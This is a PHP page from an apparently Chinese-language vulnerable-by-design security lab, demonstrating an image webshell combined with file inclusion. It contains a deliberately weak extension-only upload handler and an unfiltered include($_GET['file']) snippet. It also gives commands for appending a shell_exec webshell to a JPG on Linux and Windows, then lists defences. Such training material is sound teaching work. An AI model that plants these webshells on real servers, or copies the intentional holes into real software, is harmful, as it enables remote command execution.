<?php
// 图片马+文件包含漏洞
$module_name = '图片马+文件包含';
$module_icon = '🖼️';
$module_desc = '上传包含PHP代码的图片文件，然后通过文件包含漏洞执行其中的代码。';

// 生成随机文件名
function generateRandomFileName($originalName) {
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $randomName = uniqid("upload_", true) . "." . $ext;
    return $randomName;
}

// 漏洞代码
$message = '';
$uploaded_file = '';

// 处理文件上传
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    // 仅验证文件扩展名是否为图片
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

    if (!in_array($file_ext, $allowed_ext)) {
        $message = '仅允许上传图片文件！';
    } else {
        $upload_dir = 'uploads/';
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        $randomFileName = generateRandomFileName($file['name']);
        $target_file = $upload_dir . $randomFileName;

        if (move_uploaded_file($file['tmp_name'], $target_file)) {
            $message = '文件上传成功！';
            $uploaded_file = $target_file;
        } else {
            $message = '文件上传失败！';
        }
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">🖼️ 图片马+文件包含</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示图片马+文件包含漏洞。<br>
                攻击者可以上传包含PHP代码的图片文件（图片马），然后通过文件包含漏洞执行其中的PHP代码。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-2">文件上传代码：</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_FILES["file"])) {
    $file = $_FILES["file"];
    
    // 仅验证文件扩展名是否为图片
    $allowed_ext = ["jpg", "jpeg", "png", "gif"];
    $file_ext = strtolower(pathinfo($file["name"], PATHINFO_EXTENSION));
    
    if (!in_array($file_ext, $allowed_ext)) {
        $message = "仅允许上传图片文件！";
    } else {
        $upload_dir = "uploads/";
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }
        
        $randomFileName = generateRandomFileName($file["name"]);
        $target_file = $upload_dir . $randomFileName;
        
        if (move_uploaded_file($file["tmp_name"], $target_file)) {
            $message = "文件上传成功！";
        } else {
            $message = "文件上传失败！";
        }
    }
}

// 生成随机文件名
function generateRandomFileName($originalName) {
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $randomName = uniqid("upload_", true) . "." . $ext;
    return $randomName;
}</code></pre>
                    
                    <h5 class="mb-2 mt-4">文件包含代码：</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET["file"])) {
    $file = $_GET["file"];
    // 漏洞：直接包含用户指定的文件，没有过滤
    include($file);
}</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示图片马+文件包含漏洞，尝试以下攻击步骤：</p>

                    <h5 class="mb-2">步骤1：创建图片马</h5>

                    <h6 class="mt-3 mb-2">方法一：命令行快速生成</h6>
                    <p class="text-muted mb-2">无需手动编辑图片，直接用命令将 PHP 代码追加到图片末尾：</p>

                    <strong>Linux / macOS：</strong>
                    <pre class="bg-dark text-light p-3 rounded"><code># 复制一份原始图片，避免损坏原文件
cp original.jpg shell.jpg

# 将 PHP 代码追加到图片末尾
echo &#39;&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;&#39; >> shell.jpg</code></pre>

                    <strong class="mt-2 d-block">Windows CMD：</strong>
                    <pre class="bg-dark text-light p-3 rounded"><code>copy /b original.jpg + shell.php shell.jpg</code></pre>
                    <p class="text-muted mb-2">其中 <code>shell.php</code> 内容为：</p>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;</code></pre>

                    <strong class="mt-2 d-block">Windows PowerShell：</strong>
                    <pre class="bg-dark text-light p-3 rounded"><code>Copy-Item original.jpg shell.jpg
Add-Content -Path shell.jpg -Value &#39;&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;&#39;</code></pre>

                    <h6 class="mt-4 mb-2">方法二：手动编辑</h6>
                    <ol>
                        <li>准备一张正常的图片文件，例如：<code>test.jpg</code></li>
                        <li>使用十六进制编辑器或文本编辑器打开图片文件，在文件末尾添加PHP代码：</li>
                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;</code></pre>
                        <li class="mt-2 text-muted">注意：使用 <code>shell_exec</code> 而非 <code>system</code>，因为 <code>system()</code> 直接输出到 stdout，绕过 PHP 输出缓冲区，会导致页面无法通过 <code>ob_get_clean()</code> 捕获结果。使用 <code>shell_exec()</code> / <code>exec()</code> / 反引号则会返回字符串，可被正常捕获。</li>
                        <li>保存文件，保持扩展名不变（如：<code>test.jpg</code>）</li>
                    </ol>

                    <div class="alert alert-info mt-3 mb-0">
                        <strong>验证图片马是否有效：</strong>生成后可以用 <code>file shell.jpg</code>（Linux）确认文件类型仍为图片，用 <code>cat shell.jpg</code> 查看末尾是否包含 PHP 代码。
                    </div>

                    <h5 class="mb-2 mt-4">步骤2：上传图片马</h5>
                    <ol>
                        <li>使用下方的文件上传表单上传创建的图片马</li>
                        <li>记录上传成功后的文件路径</li>
                    </ol>

                    <h5 class="mb-2 mt-4">步骤3：通过文件包含执行代码</h5>
                    <ol>
                        <li>打开 <a href="05_include_test.php" target="_blank">文件包含测试页面</a></li>
                        <li>填入上传后的文件路径和要执行的命令，点击"执行包含"</li>
                        <li>查看执行结果，应该显示当前系统用户</li>
                    </ol>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-3">文件上传</h5>
                    <form method="POST" enctype="multipart/form-data" class="mb-5">
                        <div class="mb-3">
                            <label for="file" class="form-label">选择图片文件</label>
                            <input type="file" name="file" id="file" class="form-control" accept="image/*">
                        </div>
                        <button type="submit" class="btn btn-danger">上传文件</button>
                    </form>

                    <h5 class="mb-3">文件包含测试</h5>
                    <p>上传成功后，点击测试链接或前往 <a href="05_include_test.php" target="_blank">文件包含测试页面</a> 进行测试。</p>

                    ';

if ($message) {
    if (strpos($message, '成功') !== false) {
        $content .= '<div class="alert alert-success">
                        <strong>上传结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>';
        if ($uploaded_file) {
            $content .= '<p>上传文件路径：<code>' . htmlspecialchars($uploaded_file) . '</code></p>';
            $content .= '<p>包含测试链接：<a href="05_include_test.php?file=' . htmlspecialchars($uploaded_file) . '&cmd=whoami" target="_blank">点击测试</a></p>';
        }
        $content .= '</div>';
    } else {
        $content .= '<div class="alert alert-danger">
                        <strong>上传结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>
                    </div>';
    }
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>文件内容验证：</strong>检查文件头部特征，确保文件类型与扩展名匹配</li>
                        <li><strong>文件包含过滤：</strong>对文件包含的路径进行严格过滤，使用白名单</li>
                        <li><strong>重命名文件：</strong>使用随机文件名，避免路径遍历攻击</li>
                        <li><strong>存储位置：</strong>将上传文件存储在Web根目录外，或使用不可执行的目录</li>
                        <li><strong>权限控制：</strong>设置上传目录为不可执行，限制文件权限</li>
                        <li><strong>禁用危险函数：</strong>在php.ini中禁用system等危险函数</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>